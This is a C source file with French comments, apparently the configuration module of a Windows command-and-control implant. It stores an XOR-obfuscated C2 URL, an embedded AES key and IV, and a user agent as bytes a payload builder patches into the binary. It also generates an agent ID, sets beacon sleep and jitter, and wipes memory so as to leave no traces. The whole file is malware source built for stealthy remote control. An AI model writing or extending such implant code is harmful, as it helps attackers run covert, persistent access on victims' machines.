/*
 * config.c - Implémentation de la gestion de configuration
 *
 * La configuration est stockée de façon chiffrée dans le binaire.
 * Au runtime, on la déchiffre et on la charge en mémoire.
 */

#include "config.h"
#include "../crypto/xor.h"
#include "../utils/strings.h"

/* ============================================================================
 * Configuration chiffrée embarquée
 *
 * Ces valeurs sont XOR avec une clé statique. Le générateur de payload
 * modifie ces bytes directement dans le binaire compilé.
 * ============================================================================
 */

/* Clé XOR pour la config - sera randomisée par le builder */
static const uint8_t CONFIG_XOR_KEY[] = {0x4d, 0x3a, 0x7f, 0x12, 0x9c, 0x5e,
                                         0x88, 0xf1, 0x23, 0x67, 0xab, 0xcd,
                                         0x45, 0x89, 0xef, 0x01};

/* URL du C2 chiffrée - placeholder qui sera remplacé */
static uint8_t ENCRYPTED_C2_URL[] = {
    /* "https://127.0.0.1:443" XOR avec CONFIG_XOR_KEY */
    0x35, 0x5f, 0x1f, 0x62, 0xf1, 0x2b, 0xda, 0x82, 0x52, 0x02, 0xc8,
    0xf8, 0x71, 0xb8, 0xd8, 0x34, 0x10, 0x16, 0xc8, 0xa1, 0x00 /* null
                                                                  terminator
                                                                  area */
};
static const size_t ENCRYPTED_C2_URL_LEN = 21;

/* User-Agent chiffré */
static uint8_t ENCRYPTED_USER_AGENT[] = {
    /* Mozilla/5.0 ... simplifié pour l'exemple */
    0x00, 0x7a, 0x1d, 0x70, 0xf8, 0x39, 0xec,
    0x80, 0x11, 0x15, 0xc5, 0xa1, 0x00};
static const size_t ENCRYPTED_USER_AGENT_LEN = 13;

/* Clé AES embarquée (sera générée par le builder) */
static uint8_t EMBEDDED_AES_KEY[32] = {
    0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a,
    0x0b, 0x0c, 0x0d, 0x0e, 0x0f, 0x10, 0x11, 0x12, 0x13, 0x14, 0x15,
    0x16, 0x17, 0x18, 0x19, 0x1a, 0x1b, 0x1c, 0x1d, 0x1e, 0x1f};

static uint8_t EMBEDDED_AES_IV[16] = {0xf0, 0xe1, 0xd2, 0xc3, 0xb4, 0xa5,
                                      0x96, 0x87, 0x78, 0x69, 0x5a, 0x4b,
                                      0x3c, 0x2d, 0x1e, 0x0f};

/* ============================================================================
 * Fonctions internes
 * ============================================================================
 */

/*
 * Déchiffre une string XOR en place.
 */
static void decrypt_config_string(uint8_t *data, size_t len) {
  xor_decrypt(data, len, CONFIG_XOR_KEY, sizeof(CONFIG_XOR_KEY));
}

/*
 * Génère un UUID v4 simple.
 * Pas parfaitement random mais suffisant pour notre usage.
 */
static void generate_simple_uuid(char *out, size_t out_size) {
  if (out_size < 37)
    return;

  /* Seed basé sur le timestamp et le PID */
  LARGE_INTEGER counter;
  QueryPerformanceCounter(&counter);
  srand((unsigned int)(counter.LowPart ^ GetCurrentProcessId()));

  /* Format: xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx */
  snprintf(out, out_size, "%08x-%04x-4%03x-%04x-%012llx", (unsigned int)rand(),
           (unsigned int)(rand() & 0xFFFF), (unsigned int)(rand() & 0x0FFF),
           (unsigned int)((rand() & 0x3FFF) | 0x8000),
           ((unsigned long long)rand() << 32) | rand());
}

/* ============================================================================
 * Implémentation des fonctions publiques
 * ============================================================================
 */

int config_init(agent_config_t *config) {
  if (!config) {
    return STATUS_FAILURE;
  }

  /* Zero la structure */
  memset(config, 0, sizeof(agent_config_t));

  /* Génère l'ID de l'agent */
  config_generate_agent_id(config);

  /* Déchiffre et copie l'URL du C2 */
  uint8_t url_buffer[MAX_URL_LEN] = {0};
  memcpy(url_buffer, ENCRYPTED_C2_URL, ENCRYPTED_C2_URL_LEN);
  decrypt_config_string(url_buffer, ENCRYPTED_C2_URL_LEN);

  /* Pour le dev, on utilise la valeur en clair si le déchiffrement fail */
  if (url_buffer[0] == 0 || url_buffer[0] > 127) {
    strncpy(config->c2_url, DEFAULT_C2_URL, MAX_URL_LEN - 1);
  } else {
    strncpy(config->c2_url, (char *)url_buffer, MAX_URL_LEN - 1);
  }

  /* User-Agent */
  strncpy(config->user_agent, DEFAULT_USER_AGENT,
          sizeof(config->user_agent) - 1);

  /* Copie les clés AES */
  memcpy(config->aes_key, EMBEDDED_AES_KEY, 32);
  memcpy(config->aes_iv, EMBEDDED_AES_IV, 16);

  /* Valeurs par défaut */
  config->sleep_ms = DEFAULT_SLEEP_MS;
  config->jitter_pct = DEFAULT_JITTER_PCT;
  config->use_https = true;
  config->max_retries = 3;
  config->debug_mode = false;

  /* Efface les buffers temporaires */
  SecureZeroMemory(url_buffer, sizeof(url_buffer));

  return STATUS_SUCCESS;
}

void config_set_sleep(agent_config_t *config, DWORD sleep_ms) {
  if (!config)
    return;

  /* Valide les bornes */
  if (sleep_ms < MIN_SLEEP_MS) {
    sleep_ms = MIN_SLEEP_MS;
  } else if (sleep_ms > MAX_SLEEP_MS) {
    sleep_ms = MAX_SLEEP_MS;
  }

  config->sleep_ms = sleep_ms;
}

void config_set_jitter(agent_config_t *config, int jitter_pct) {
  if (!config)
    return;

  /* Jitter entre 0 et 50% */
  if (jitter_pct < 0)
    jitter_pct = 0;
  if (jitter_pct > 50)
    jitter_pct = 50;

  config->jitter_pct = jitter_pct;
}

void config_generate_agent_id(agent_config_t *config) {
  if (!config)
    return;

  /*
   * TODO: Dans une vraie implémentation, on stockerait l'ID quelque part
   * (registry, fichier caché) pour le garder entre les restarts.
   * Pour l'instant on génère un nouveau à chaque fois.
   */
  generate_simple_uuid(config->agent_id, sizeof(config->agent_id));
}

void config_cleanup(agent_config_t *config) {
  if (!config)
    return;

  /* Zero la config pour pas laisser de traces en mémoire */
  SecureZeroMemory(config, sizeof(agent_config_t));
}
